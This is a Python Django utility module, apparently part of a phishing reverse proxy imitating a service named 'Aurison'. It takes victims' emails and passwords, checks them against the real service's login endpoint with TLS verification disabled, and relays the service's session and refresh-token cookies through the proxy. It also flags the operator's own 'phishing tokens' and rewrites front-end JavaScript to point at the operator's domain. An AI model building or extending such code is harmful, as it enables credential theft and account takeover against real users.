from django.http import HttpResponse, JsonResponse
from http.cookies import SimpleCookie

from requests import Response, post
from decouple import config
from os.path import join, exists
from os import getcwd




def buildHttpRespone(res: Response) -> HttpResponse:
    #Parse the response from requests lib and build a valid django response.
    #The major thing here is to pass along the cookies and json body from Aurison
    djangoResponse = HttpResponse(
        content=res.text, 
        content_type=res.headers['Content-Type'], 
        status=res.status_code
    )
    
    del res.headers["Connection"]       #This was causing an exception, not sure why.

    for key, value in res.headers.items():
        if not key == 'Set-Cookie':
            djangoResponse[key] = value
            continue
        

        #For whatever reason, requests.cookie.RequestsCookieJar doesn't parse the cookies correctly.
        #It ends up leaving out things like max-age and expiry time. So we use http.cookies.SimpleCookie
        #Also, the value of res.headers.get('Set-Cookie') still breaks the parser, so I did a bit of 
        #manual parsing. Future updates to Aurison will likely break this block.
        splitCookies = res.headers.get('Set-Cookie').split('; Secure,')      #wonky work around to grab each cookie.

        rawCookies = [cookie + '; Secure' for cookie in splitCookies]         #Add the Secure attr back to each cookie.

        cookieParser = SimpleCookie()
        
        for cookie in rawCookies:
            #Update the refresh token expiry so it can be parsed properly. 
            #Only refresh_token cookie has an expiry of 30 days.
            cookie = cookie.replace('30 days, 0:00:00;', '2592000;')

            cookieParser.load(cookie)   
            
            for _, morsel in cookieParser.items():
                djangoResponse.set_cookie(
                    key = morsel.key,
                    value = morsel.value,
                    secure = morsel['secure'],
                    httponly = morsel['httponly'],
                    samesite = morsel['samesite'],
                    path = morsel['path'],
                    expires= morsel['expires']
                )

    return djangoResponse





def isPhishingToken(token: str) -> bool:
    #check if token was generated by us
    if '700r' in token:
        return True
    
    return False





def checkLogin(email: str, password: str, url:str) -> dict:
    #Check if login is valid.
    payload = {
        'username' : email,
        'password' : password
    }
    
    try:
        res = post(f'{url}/login', json=payload, verify=False)
        json = res.json()

        if json['message'] == 'Login successfully':
            return {
                'valid' : True,
                'response' : json
            }
        
        return {
            'valid' : False,
            'response' : buildHttpRespone(res)
        }         
        

    except Exception as e:
        print(e)        #Debug

        return {
            'valid' : False,
            'response' : JsonResponse({
                'error' : True,
                'error_log' : 'old password is incorrect!'
            })
        }






def buildJsFiles():
    #This function is called in proxy.apps
    domain = config('DOMAIN_URL')

    files = {
        'main_original' : 'main.5c5dbc43',
        'main_mod' : 'main.5c5dbc1337'
    }
   
    for templateJS, outputJS in files.items():
        try:
            inputFilePath = join(getcwd(), 'proxy', 'static', 'js', f'{templateJS}.js')
            outputFilePath = join(getcwd(), 'proxy', 'static', 'js', f'{outputJS}.js')
            
            content = open(inputFilePath).read()
            content = content.replace('API_URL_TO_REPLACE', domain)

            with open(outputFilePath, 'w') as jsFile:
                jsFile.write(content)

        except Exception as e:
            print(e)

            from os import exit
            exit()      #Kill the server